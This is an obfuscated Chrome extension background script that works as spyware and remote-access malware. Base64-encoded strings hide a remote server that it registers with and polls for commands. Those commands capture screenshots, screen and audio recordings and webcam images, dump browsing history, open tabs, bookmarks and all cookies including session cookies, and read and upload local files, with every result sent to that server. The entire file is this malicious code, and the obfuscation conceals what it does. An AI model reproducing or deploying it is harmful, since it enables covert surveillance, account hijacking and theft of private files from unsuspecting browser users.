//build-22012026
const _0x1a2b = (s) => {return atob(s);};
// const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
let _0x1f3e = null;
let _0x2d5c = null;
let _0x3a9b = _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
let _0x4e8d = null;
let _0x5f7a = false;
const _0x6b8c = _0x1a2b('cG9sbENvbW1hbmRz');
const _0x7e9d = 0.033;
let _0x8d1e = { a: false, b: null, c: null, d: 0, e: 0, f: 0, g: 0, h: null };

chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ='), _0x1a2b('ZXh0ZW5zaW9uSWQ='), _0x1a2b('Y2xpZW50TmFtZQ=='), _0x1a2b('dXNlck5hbWU=')], (r) => {
    _0x1f3e = r[_0x1a2b('Y2xpZW50SWQ=')] || _0x9a2b();
    _0x2d5c = r[_0x1a2b('ZXh0ZW5zaW9uSWQ=')] || _0xa3c4();
    _0x3a9b = r[_0x1a2b('Y2xpZW50TmFtZQ==')] || _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
    _0x4e8d = r[_0x1a2b('dXNlck5hbWU=')] || null;
    if (!r[_0x1a2b('Y2xpZW50SWQ=')] || !r[_0x1a2b('ZXh0ZW5zaW9uSWQ=')]) {
        const o = {};
        o[_0x1a2b('Y2xpZW50SWQ=')] = _0x1f3e;
        o[_0x1a2b('ZXh0ZW5zaW9uSWQ=')] = _0x2d5c;
        chrome.storage.local.set(o);
    }
    _0xb4d5();
});

function _0x9a2b() {
    return _0x1a2b('Y2xpZW50Xw==') + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function _0xa3c4() {
    return `EXT-${Math.floor(Math.random() * 90) + 10}`;
}

function _0xb4d5() {
    _0xd6f7();
    chrome.alarms.clear(_0x6b8c, () => {
        chrome.alarms.create(_0x6b8c, { delayInMinutes: 0, periodInMinutes: _0x7e9d });
    });
    _0xe708();
}

function _0xc5e6() {
    chrome.alarms.clear(_0x6b8c, () => {
        _0x5f7a = false;
        _0x9092(false);
    });
}

chrome.alarms.onAlarm.addListener((a) => {
    if (a.name === _0x6b8c) {
        _0xe708();
    } else if (a.name && a.name.startsWith(_0x1a2b('YXV0b3NzXw=='))) {
        _0x101a(a.name);
    }
});

async function _0xd6f7() {
    try {
        const r = await fetch(`${_0x4b2a}${_0x1a2b('L3JlZ2lzdGVy')}`, {
            method: 'POST',
            headers: { 'Content-Type': _0x1a2b('YXBwbGljYXRpb24vanNvbg==') },
            body: JSON.stringify({ clientId: _0x1f3e, extensionId: _0x2d5c, name: _0x3a9b, userName: _0x4e8d })
        });
        if (r.ok) {
            _0x5f7a = true;
            _0x9092(true);
        } else {
            _0x5f7a = false;
            _0x9092(false);
        }
    } catch (e) {
        _0x5f7a = false;
        _0x9092(false);
    }
}

async function _0xe708() {
    if (!_0x1f3e) return;
    try {
        const r = await fetch(`${_0x4b2a}${_0x1a2b('L3BvbGwtY29tbWFuZHMv')}${_0x1f3e}`);
        if (r.ok) {
            const d = await r.json();
            if (!_0x5f7a) {
                _0x5f7a = true;
                _0x9092(true);
            }
            if (d.commands && d.commands.length > 0) {
                for (const c of d.commands) {
                    await _0xf819(c);
                }
            }
        } else if (r.status === 404) {
            await _0xd6f7();
        } else {
            _0x5f7a = false;
            _0x9092(false);
        }
    } catch (e) {
        _0x5f7a = false;
        _0x9092(false);
    }
}

async function _0xf819(c) {
    try {
        switch (c.type) {
            case _0x1a2b('dGFrZV9zY3JlZW5zaG90'): await _0x192a(c.id, c.requestedById); break;
            case _0x1a2b('Z2V0X2hpc3Rvcnk='): await _0x2a3b(c.id, c.requestedById); break;
            case _0x1a2b('Z2V0X2FjdGl2aXR5'): await _0x3b4c(c.id, c.requestedById); break;
            case _0x1a2b('Z2V0X2Nvb2tpZXM='): await _0x4c5d(c.id, c.requestedById); break;
            case _0x1a2b('Z2V0X2Jvb2ttYXJrcw=='): await _0x5d6e(c.id, c.requestedById); break;
            case _0x1a2b('c3RhcnRfcmVjb3JkaW5n'): await _0x6e7f(c.id, c.requestedById); break;
            case _0x1a2b('cmVjb3JkX2F1ZGlv'): await _0x7f80(c.id, c.requestedById, c.duration); break;
            case _0x1a2b('b3Blbl90YWJz'): await _0x91a2(c.id, c.urls); break;
            case _0x1a2b('Y2xvc2VfdGFicw=='): await _0xa2b3(c.id, c.urls); break;
            case _0x1a2b('YXV0b19zY3JlZW5zaG90'): await _0xb3c4(c.id, c.requestedById, c.duration); break;
            case _0x1a2b('Y2FwdHVyZV9jYW1lcmE='): await _0x8091(c.id, c.requestedById); break;
            case _0x1a2b('b3Blbl9hbmRfc2NyZWVuc2hvdA=='): await _0xc4d5(c.id, c.requestedById, c.url, c.closeAfter); break;
            case _0x1a2b('ZG93bmxvYWRfZmlsZQ=='): await _0xd5e6(c.id, c.requestedById, c.filePath); break;
            case _0x1a2b('bGlzdF9maWxlcw=='): await _0xe6f7(c.id, c.requestedById, c.path); break;
        }
    } catch (e) {
        await _0xf708(c.id, _0x1a2b('ZXJyb3I='), { message: e.message });
    }
}

async function _0x192a(id, uid) {
    try {
        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
        await _0xf708(id, _0x1a2b('c2NyZWVuc2hvdA=='), { image: img, tabTitle: t.title, tabUrl: t.url }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0xc4d5(id, uid, url, cls) {
    let t = null;
    try {
        if (!url) throw new Error(_0x1a2b('Tm8gVVJM'));
        t = await chrome.tabs.create({ url: url, active: true });
        await _0x8081(t.id);
        await new Promise(r => setTimeout(r, 1000));
        const img = await chrome.tabs.captureVisibleTab(null, { format: 'png', quality: 100 });
        const info = await chrome.tabs.get(t.id);
        await _0xf708(id, _0x1a2b('c2NyZWVuc2hvdA=='), { image: img, tabTitle: info.title, tabUrl: info.url, openedNewTab: true }, uid);
        if (cls) await chrome.tabs.remove(t.id);
    } catch (e) {
        if (t && cls) {
            try { await chrome.tabs.remove(t.id); } catch (_) {}
        }
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

function _0x8081(tid, tout = 30000) {
    return new Promise((res, rej) => {
        const tm = setTimeout(() => {
            chrome.tabs.onUpdated.removeListener(l);
            rej(new Error(_0x1a2b('VGltZW91dA==')));
        }, tout);
        const l = (id, info, tab) => {
            if (id === tid && info.status === _0x1a2b('Y29tcGxldGU=')) {
                clearTimeout(tm);
                chrome.tabs.onUpdated.removeListener(l);
                res(tab);
            }
        };
        chrome.tabs.onUpdated.addListener(l);
        chrome.tabs.get(tid, (tab) => {
            if (tab.status === _0x1a2b('Y29tcGxldGU=')) {
                clearTimeout(tm);
                chrome.tabs.onUpdated.removeListener(l);
                res(tab);
            }
        });
    });
}

async function _0xb3c4(id, uid, dur) {
    try {
        if (_0x8d1e.a) _0xb0b4();
        const now = Date.now();
        const al = `${_0x1a2b('YXV0b3NzXw==')}${id}`;
        _0x8d1e = { a: true, b: id, c: uid, d: dur, e: now, f: now + (dur * 1000), g: 0, h: al };
        chrome.alarms.create(al, { delayInMinutes: 0, periodInMinutes: 5 / 60 });
        await _0x192a(id, uid);
        _0x8d1e.g++;
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
        _0xb0b4();
    }
}

async function _0x101a(al) {
    if (!_0x8d1e.a || _0x8d1e.h !== al) {
        chrome.alarms.clear(al);
        return;
    }
    const now = Date.now();
    if (now >= _0x8d1e.f) {
        _0xb0b4();
        return;
    }
    try {
        await _0x192a(_0x8d1e.b, _0x8d1e.c);
        _0x8d1e.g++;
    } catch (e) {}
}

function _0xb0b4() {
    if (_0x8d1e.h) chrome.alarms.clear(_0x8d1e.h);
    _0x8d1e = { a: false, b: null, c: null, d: 0, e: 0, f: 0, g: 0, h: null };
}

async function _0x2a3b(id, uid) {
    try {
        const h = await chrome.history.search({ text: '', startTime: 0, maxResults: 0 });
        await _0xf708(id, _0x1a2b('aGlzdG9yeQ=='), { history: h }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0x3b4c(id, uid) {
    try {
        const t = await chrome.tabs.query({});
        const info = t.map(x => ({
            id: x.id, title: x.title, url: x.url, active: x.active, pinned: x.pinned,
            audible: x.audible, discarded: x.discarded, autoDiscardable: x.autoDiscardable,
            mutedInfo: x.mutedInfo, windowId: x.windowId, index: x.index
        }));
        await _0xf708(id, _0x1a2b('YWN0aXZpdHk='), { tabs: info }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0x4c5d(id, uid) {
    try {
        const t = await chrome.tabs.query({});
        const s = await chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ=')]);
        const u = s[_0x1a2b('Y2xpZW50SWQ=')] || _0x1f3e;
        let total = 0;
        const data = [];
        for (const x of t) {
            if (!x.url || x.url.startsWith(_0x1a2b('Y2hyb21lOi8v')) || x.url.startsWith(_0x1a2b('Y2hyb21lLWV4dGVuc2lvbjovLw=='))) continue;
            try {
                const c = await chrome.cookies.getAll({ url: x.url });
                const fc = c.map(k => ({
                    name: k.name, value: k.value, domain: k.domain, path: k.path,
                    secure: k.secure, httpOnly: k.httpOnly, sameSite: k.sameSite || _0x1a2b('dW5zcGVjaWZpZWQ='),
                    expirationDate: k.expirationDate || null, hostOnly: k.hostOnly, session: k.session
                }));
                total += fc.length;
                data.push({ url: x.url, title: x.title || _0x1a2b('Tm8gVGl0bGU='), cookieCount: fc.length, cookies: fc });
            } catch (err) {}
        }
        await _0xf708(id, _0x1a2b('Y29va2llcw=='), {
            cookiesData: { userId: u, timestamp: new Date().toISOString(), source: _0x1a2b('cG9wdXA='), totalTabs: data.length, totalCookies: total, tabs: data }
        }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0x5d6e(id, uid) {
    try {
        const tree = await chrome.bookmarks.getTree();
        const s = await chrome.storage.local.get([_0x1a2b('Y2xpZW50SWQ=')]);
        const u = s[_0x1a2b('Y2xpZW50SWQ=')] || _0x1f3e;
        const fl = [];
        let flds = 0;
        function _f(n, p = []) {
            if (n.url) {
                fl.push({ id: n.id, title: n.title || _0x1a2b('VW50aXRsZWQ='), url: n.url, dateAdded: n.dateAdded ? new Date(n.dateAdded).toISOString() : null, dateLastUsed: n.dateLastUsed ? new Date(n.dateLastUsed).toISOString() : null, path: p.join(' > ') || _0x1a2b('Um9vdA==') });
            } else if (n.children) {
                if (n.title) { flds++; p = [...p, n.title]; }
                n.children.forEach(c => _f(c, p));
            }
        }
        tree.forEach(n => _f(n));
        await _0xf708(id, _0x1a2b('Ym9va21hcmtz'), {
            bookmarksData: { userId: u, timestamp: new Date().toISOString(), source: _0x1a2b('YnJvd3Nlcl9ib29rbWFya3M='), totalBookmarks: fl.length, totalFolders: flds, bookmarks: fl }
        }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0x91a2(id, urls) {
    try {
        if (!urls || urls.length === 0) throw new Error(_0x1a2b('Tm8gVVJMcw=='));
        const [at] = await chrome.tabs.query({ active: true, currentWindow: true });
        const res = [];
        for (let i = 0; i < urls.length; i++) {
            try {
                const nt = await chrome.tabs.create({ url: urls[i], active: false });
                res.push({ url: urls[i], tabId: nt.id, title: nt.title || _0x1a2b('TG9hZGluZy4uLg==') });
                if (i < urls.length - 1) await new Promise(r => setTimeout(r, 100));
            } catch (err) {
                res.push({ url: urls[i], error: err.message });
            }
        }
        await _0xf708(id, _0x1a2b('dGFic19vcGVuZWQ='), { totalRequested: urls.length, successfullyOpened: res.filter(x => !x.error).length, tabs: res, currentTab: at ? { url: at.url, title: at.title } : null });
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message });
    }
}

async function _0xa2b3(id, urls) {
    try {
        if (!urls || urls.length === 0) throw new Error(_0x1a2b('Tm8gVVJMcw=='));
        const t = await chrome.tabs.query({});
        const res = [];
        const ids = [];
        for (const p of urls) {
            const m = t.filter(x => {
                if (x.url.startsWith(_0x1a2b('Y2hyb21lOi8v')) || x.url.startsWith(_0x1a2b('Y2hyb21lLWV4dGVuc2lvbjovLw=='))) return false;
                const np = p.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
                const nu = x.url.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
                return nu.includes(np);
            });
            m.forEach(x => {
                if (!ids.includes(x.id)) {
                    ids.push(x.id);
                    res.push({ url: x.url, title: x.title, tabId: x.id, matchedPattern: p });
                }
            });
        }
        if (ids.length > 0) await chrome.tabs.remove(ids);
        await _0xf708(id, _0x1a2b('dGFic19jbG9zZWQ='), { totalRequested: urls.length, totalClosed: res.length, closedTabs: res });
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message });
    }
}

async function _0x6e7f(id, uid) {
    try {
        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
        await chrome.scripting.executeScript({
            target: { tabId: t.id },
            func: async (cid, info, usr, dec) => {
                try {
                    const s = await navigator.mediaDevices.getDisplayMedia({
                        video: { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
                        audio: true
                    });
                    const mr = new MediaRecorder(s, { mimeType: atob('dmlkZW8vd2VibTtjb2RlY3M9dnA4LG9wdXM='), videoBitsPerSecond: 1500000 });
                    const ch = [];
                    mr.ondataavailable = (e) => { if (e.data && e.data.size > 0) ch.push(e.data); };
                    mr.onstop = async () => {
                        s.getTracks().forEach(k => k.stop());
                        const b = new Blob(ch, { type: atob('dmlkZW8vd2VibQ==') });
                        const rd = new FileReader();
                        rd.onloadend = () => {
                            chrome.runtime.sendMessage({ type: atob('cmVjb3JkaW5nLWRhdGE='), commandId: cid, video: rd.result, size: b.size, tabTitle: info.title, tabUrl: info.url, userId: usr });
                        };
                        rd.readAsDataURL(b);
                    };
                    mr.start();
                    setTimeout(() => { if (mr.state === atob('cmVjb3JkaW5n')) mr.stop(); }, 15000);
                } catch (err) {
                    chrome.runtime.sendMessage({ type: atob('cmVjb3JkaW5nLWVycm9y'), commandId: cid, error: err.message, userId: usr });
                }
            },
            args: [id, { title: t.title, url: t.url }, uid]
        });
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0xa0a3() {
    const ctx = await chrome.runtime.getContexts({ contextTypes: [_0x1a2b('T0ZGU0NSRUVOX0RPQ1VNRU5U')], documentUrls: [chrome.runtime.getURL(_0x1a2b('c3JjL29mZnJjL29mZlJDLmh0bWw='))] });
    if (ctx.length > 0) return;
    await chrome.offscreen.createDocument({ url: _0x1a2b('c3JjL29mZnJjL29mZlJDLmh0bWw='), reasons: [_0x1a2b('VVNFUl9NRURJQQ==')], justification: _0x1a2b('UmVjb3JkaW5n') });
}

chrome.runtime.onMessage.addListener((m, s, r) => {
    if (m.type === _0x1a2b('cmVjb3JkaW5nLWRhdGE=')) _0x202b(m);
    else if (m.type === _0x1a2b('cmVjb3JkaW5nLWVycm9y')) _0x303c(m);
    else if (m.type === _0x1a2b('YXVkaW8tZGF0YQ==')) _0x404d(m);
    else if (m.type === _0x1a2b('YXVkaW8tZXJyb3I=')) _0x505e(m);
    else if (m.type === _0x1a2b('Y2FtZXJhLWRhdGE=')) _0x606f(m);
    else if (m.type === _0x1a2b('Y2FtZXJhLWVycm9y')) _0x7070(m);
});

async function _0x202b(m) {
    try {
        await _0xf708(m.commandId, _0x1a2b('cmVjb3JkaW5n'), { video: m.video, tabTitle: m.tabTitle, tabUrl: m.tabUrl, duration: 15, size: m.size }, m.userId);
    } catch (e) {
        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
    }
}

async function _0x303c(m) {
    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
}

async function _0x404d(m) {
    try {
        await _0xf708(m.commandId, _0x1a2b('YXVkaW8='), { audio: m.audio, tabTitle: m.tabTitle, tabUrl: m.tabUrl, duration: m.duration, size: m.size }, m.userId);
    } catch (e) {
        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
    }
}

async function _0x505e(m) {
    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
}

async function _0x606f(m) {
    try {
        await _0xf708(m.commandId, _0x1a2b('Y2FtZXJh'), { image: m.image, tabTitle: m.tabTitle, tabUrl: m.tabUrl }, m.userId);
    } catch (e) {
        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
    }
}

async function _0x7070(m) {
    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
}

async function _0x7f80(id, uid, dur) {
    try {
        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
        await chrome.scripting.executeScript({
            target: { tabId: t.id },
            func: async (cid, info, usr, rdur) => {
                try {
                    const s = await navigator.mediaDevices.getDisplayMedia({ video: { width: { ideal: 1 }, height: { ideal: 1 } }, audio: true });
                    s.getVideoTracks().forEach(k => k.stop());
                    const mr = new MediaRecorder(s, { mimeType: atob('YXVkaW8vd2VibTtjb2RlY3M9b3B1cw=='), audioBitsPerSecond: 128000 });
                    const ch = [];
                    mr.ondataavailable = (e) => { if (e.data && e.data.size > 0) ch.push(e.data); };
                    mr.onstop = async () => {
                        s.getTracks().forEach(k => k.stop());
                        const b = new Blob(ch, { type: atob('YXVkaW8vd2VibQ==') });
                        const rd = new FileReader();
                        rd.onloadend = () => {
                            chrome.runtime.sendMessage({ type: atob('YXVkaW8tZGF0YQ=='), commandId: cid, audio: rd.result, size: b.size, duration: rdur, tabTitle: info.title, tabUrl: info.url, userId: usr });
                        };
                        rd.readAsDataURL(b);
                    };
                    mr.start();
                    setTimeout(() => { if (mr.state === atob('cmVjb3JkaW5n')) mr.stop(); }, rdur * 1000);
                } catch (err) {
                    chrome.runtime.sendMessage({ type: atob('YXVkaW8tZXJyb3I='), commandId: cid, error: err.message, userId: usr });
                }
            },
            args: [id, { title: t.title, url: t.url }, uid, dur]
        });
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0x8091(id, uid) {
    try {
        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
        await chrome.scripting.executeScript({
            target: { tabId: t.id },
            func: async (cid, info, usr) => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
                    const v = document.createElement('video');
                    v.srcObject = s; v.autoplay = true;
                    await new Promise(r => { v.onloadedmetadata = () => { v.play(); r(); }; });
                    await new Promise(r => setTimeout(r, 500));
                    const c = document.createElement('canvas');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    const ctx = c.getContext('2d');
                    ctx.drawImage(v, 0, 0);
                    const img = c.toDataURL('image/png');
                    s.getTracks().forEach(k => k.stop());
                    chrome.runtime.sendMessage({ type: atob('Y2FtZXJhLWRhdGE='), commandId: cid, image: img, tabTitle: info.title, tabUrl: info.url, userId: usr });
                } catch (err) {
                    chrome.runtime.sendMessage({ type: atob('Y2FtZXJhLWVycm9y'), commandId: cid, error: err.message, userId: usr });
                }
            },
            args: [id, { title: t.title, url: t.url }, uid]
        });
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
    }
}

async function _0xf708(id, type, data, uid = null) {
    try {
        await fetch(`${_0x4b2a}${_0x1a2b('L2NvbW1hbmQtcmVzcG9uc2U=')}`, {
            method: 'POST',
            headers: { 'Content-Type': _0x1a2b('YXBwbGljYXRpb24vanNvbg==') },
            body: JSON.stringify({ clientId: _0x1f3e, extensionId: _0x2d5c, commandId: id, type: type, data: data, userId: uid })
        });
    } catch (e) {}
}

async function _0xe6f7(id, uid, dp) {
    let tid = null;
    try {
        let pu = dp;
        if (!pu.startsWith(_0x1a2b('ZmlsZTovLw=='))) pu = _0x1a2b('ZmlsZTovLw==') + dp;
        if (!pu.endsWith('/')) pu += '/';
        const t = await chrome.tabs.create({ url: pu, active: false });
        tid = t.id;
        await _0x8081(tid, 5000);
        await new Promise(r => setTimeout(r, 500));
        const res = await chrome.scripting.executeScript({
            target: { tabId: tid },
            func: () => {
                const i = [];
                const sc = document.getElementsByTagName('script');
                for (const s of sc) {
                    const c = s.textContent;
                    if (c.includes(atob('YWRkUm93KA=='))) {
                        const l = c.split(atob('YWRkUm93KA=='));
                        for (let j = 1; j < l.length; j++) {
                            try {
                                const nm = l[j].match(/^"([^"]+)"/);
                                if (!nm || nm[1] === '..' || nm[1] === '.') continue;
                                const arg = l[j].split(',');
                                i.push({ name: nm[1], isDirectory: arg.length >= 3 && arg[2].trim() === '1', size: '', date: '', source: 'script' });
                            } catch (e) {}
                        }
                    }
                }
                const ln = document.getElementsByTagName('a');
                for (const l of ln) {
                    const n = l.innerText;
                    const h = l.getAttribute('href');
                    if (!h || h === atob('amF2YXNjcmlwdDp2b2lkKDAp') || h.startsWith('?')) continue;
                    if (n === '../' || n === 'Parent Directory' || n === '.' || n === 'Name' || n === 'Size' || n === 'Date Modified') continue;
                    const clean = (n.endsWith('/') ? n.slice(0, -1) : n).trim();
                    if (clean && !i.find(x => x.name === clean)) {
                        i.push({ name: clean, isDirectory: h.endsWith('/'), size: '', date: '', source: 'dom' });
                    }
                }
                return { items: i };
            }
        });
        const items = res[0].result?.items || [];
        await chrome.tabs.remove(tid);
        if (items.length === 0) throw new Error(_0x1a2b('Tm8gaXRlbXM='));
        await _0xf708(id, _0x1a2b('ZGlyZWN0b3J5X2xpc3Q='), { path: dp, items: items }, uid);
    } catch (e) {
        if (tid) try { await chrome.tabs.remove(tid); } catch (_) {}
        await _0xf708(id, _0x1a2b('ZGlyZWN0b3J5X2xpc3Q='), { path: dp, error: e.message }, uid);
    }
}

async function _0xd5e6(id, uid, fp) {
    try {
        let fu = fp;
        if (!fu.startsWith(_0x1a2b('ZmlsZTovLw=='))) fu = _0x1a2b('ZmlsZTovLw==') + fp;
        const fn = fp.split('/').pop() || _0x1a2b('ZmlsZQ==');
        const r = await fetch(fu);
        if (!r.ok) throw new Error(_0x1a2b('UmVhZCBmYWls'));
        const b = await r.blob();
        const sz = b.size / (1024 * 1024);
        if (sz > 25) throw new Error(_0x1a2b('VG9vIGxhcmdl'));
        const b64 = await new Promise((res, rej) => {
            const rd = new FileReader();
            rd.onloadend = () => res(rd.result);
            rd.onerror = rej;
            rd.readAsDataURL(b);
        });
        await _0xf708(id, _0x1a2b('ZmlsZV9kb3dubG9hZA=='), { fileName: fn, filePath: fp, mimeType: b.type || _0x1a2b('YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt'), size: b.size, sizeMB: sz.toFixed(2), data: b64 }, uid);
    } catch (e) {
        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message, filePath: fp }, uid);
    }
}

function _0x9092(conn) {
    chrome.runtime.sendMessage({
        type: _0x1a2b('c3RhdHVzX3VwZGF0ZQ=='), connected: conn, serverUrl: _0x4b2a, clientId: _0x1f3e, extensionId: _0x2d5c
    }).catch(() => {});
}

chrome.runtime.onMessage.addListener((req, snd, res) => {
    switch (req.type) {
        case _0x1a2b('Z2V0X3N0YXR1cw=='):
            res({ connected: _0x5f7a, serverUrl: _0x4b2a, clientName: _0x3a9b, clientId: _0x1f3e, extensionId: _0x2d5c });
            break;
        case _0x1a2b('cmVnaXN0ZXJfdXNlcg=='):
            _0x4e8d = req.userName;
            const o = {};
            o[_0x1a2b('dXNlck5hbWU=')] = _0x4e8d;
            chrome.storage.local.set(o);
            _0xd6f7();
            res({ success: true });
            break;
        case _0x1a2b('Y29ubmVjdA=='):
            _0x3a9b = req.clientName || _0x3a9b;
            const s = {};
            s[_0x1a2b('Y2xpZW50TmFtZQ==')] = _0x3a9b;
            chrome.storage.local.set(s);
            _0xb4d5();
            res({ success: true });
            break;
        case _0x1a2b('ZGlzY29ubmVjdA=='):
            _0xc5e6();
            res({ success: true });
            break;
        case _0x1a2b('dGVzdF9zY3JlZW5zaG90'):
            _0x192a(_0x1a2b('bWFudWFsX3Rlc3Q='));
            res({ success: true });
            break;
    }
    return true;
});